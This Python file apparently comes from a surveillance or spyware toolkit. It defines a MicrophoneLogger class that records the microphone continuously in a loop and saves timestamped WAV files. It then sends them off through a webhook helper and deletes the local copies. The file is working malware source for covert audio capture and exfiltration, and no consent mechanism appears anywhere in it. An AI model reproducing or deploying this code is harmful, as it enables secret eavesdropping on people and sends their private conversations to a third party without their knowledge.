import sounddevice
import scipy.io.wavfile as wavfile
import time
import os

from config import (
    LOG_DIRECTORY_PATH,
    MICROPHONE_RECORD_DURATION_SEC,
)
from utils.logging_utils import log_error, log_info, timestamp
from utils.webhook_utils import send_log_files_in_directory
from utils.file_utils import clear_files_in_log_directory


class MicrophoneLogger:
    def __init__(self):
        log_info("Microphone logger initialized.")
        self.log_directory = "microphone"
        self.log_directory_path = os.path.join(LOG_DIRECTORY_PATH, self.log_directory)
        self.interval = MICROPHONE_RECORD_DURATION_SEC
        self.running = True

    def log_microphone(self):
        recording = sounddevice.rec(
            int(self.interval * 44100), samplerate=44100, channels=1, dtype="int16"
        )
        sounddevice.wait()
        wavfile.write(
            os.path.join(self.log_directory_path, f"{timestamp()}.wav"),
            44100,
            recording,
        )
        log_info(
            f"Logged microphone recording to {os.path.join(self.log_directory_path, f'{timestamp()}.wav')}"
        )

    def send_logs(self):
        send_log_files_in_directory("`Sending microphone logs...`", self.log_directory)
        clear_files_in_log_directory(self.log_directory)
        log_info("Sent and cleared microphone log files.")

    def run(self):
        try:
            while self.running:
                self.log_microphone()
                time.sleep(1)
        except Exception as e:
            self.running = False
            log_error(e)
